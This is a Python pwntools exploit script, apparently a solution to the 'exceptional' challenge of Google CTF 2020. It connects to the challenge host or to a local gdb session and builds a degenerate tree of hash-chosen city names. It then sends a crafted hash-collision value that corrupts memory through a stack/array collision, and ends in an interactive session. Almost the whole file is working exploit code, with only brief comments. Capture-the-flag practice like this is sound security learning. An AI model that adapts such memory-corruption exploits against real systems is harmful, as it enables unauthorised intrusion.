#!/usr/bin/env python3
from pwn import *


def hash_name(name):
    if not isinstance(name, bytes):
        name = name.encode()
    result = 0x12345678
    while len(name) >= 4:
        result ^= struct.unpack('<I', name[:4])[0]
        name = name[4:]
    assert len(name) == 0
    return result


class City:
    def __init__(self, delta, r):
        self.name = ''.join(
            [r.choice(string.ascii_letters) for _ in range(44)])
        self.name_hash = hash_name(self.name)
        self.delta = delta


def main():
    if args.LOCAL:
        tube = gdb.debug(['./exceptional.dbg'], gdbscript='''
set pagination off
b printf_current_time_in_var3
#watch *(long*)&cities[97]
#watch *((long*)&cities[97] + 1)
c
''')
    else:
        tube = remote('exceptional.2020.ctfcompetition.com', 1337)
    with tube:
        # create a degenerate tree, which is really a list
        r = random.Random(666)
        cities = [City(i % 24, r) for i in range(98)]
        cities.sort(key=lambda city: -city.name_hash)
        for city in cities:
            print(f'# {city.name}=0x{city.name_hash:x} {city.delta}')
            tube.sendline('1')
            tube.sendline(f'{city.name} {city.delta}')

        # corrupt list tail by colliding stack with city array
        # 0x71c is what city hash happens to be overwritten with
        magic = struct.pack('<I', 0x12345678 ^ 0x71c)
        assert hash_name(magic) == 0x71c
        tube.sendline('3')
        tube.recvuntil(b'Type your city and current time')
        tube.sendline(f'{cities[0].name} 04:20')
        tube.sendline(magic)


        tube.interactive()


if __name__ == '__main__':
    main()
